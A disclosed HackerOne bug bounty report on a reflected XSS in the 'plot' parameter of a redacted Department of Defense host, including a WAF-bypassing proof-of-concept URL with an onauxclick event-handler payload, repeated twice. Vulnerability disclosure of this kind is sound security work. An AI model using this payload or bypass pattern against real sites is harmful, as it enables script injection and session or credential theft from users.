# Reflected XSS | https://████████

## Report Details
- **Report ID**: 1736433
- **URL**: https://hackerone.com/reports/1736433
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-10-16T00:49:16.504Z
- **Disclosed**: 2022-11-18T18:33:38.834Z

## Reporter
- **Username**: x3ph_
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Summary

Hi team, there's a reflected XSS on https://████ using the `plot` param. There's a WAF in place but it's possible to bypass it.
Steps to reproduce

1. Click https://██████████/fcgi-bin/getplot.py?plot=aaa%3Ch1%20onauxclick=confirm(document.domain)%3ERIGHT%20CLICK%20HERE
2. Observe the popup showing document.domain when right clicking "RIGHT CLICK HERE"

███

## Impact

The attacker can trigger remote code execution on the victim’s browser, and steal credentials, sessions, and potentially send malware to the victim.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. Click https://████████/fcgi-bin/getplot.py?plot=aaa%3Ch1%20onauxclick=confirm(document.domain)%3ERIGHT%20CLICK%20HERE
2. Observe the popup showing document.domain when right clicking "RIGHT CLICK HERE"

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
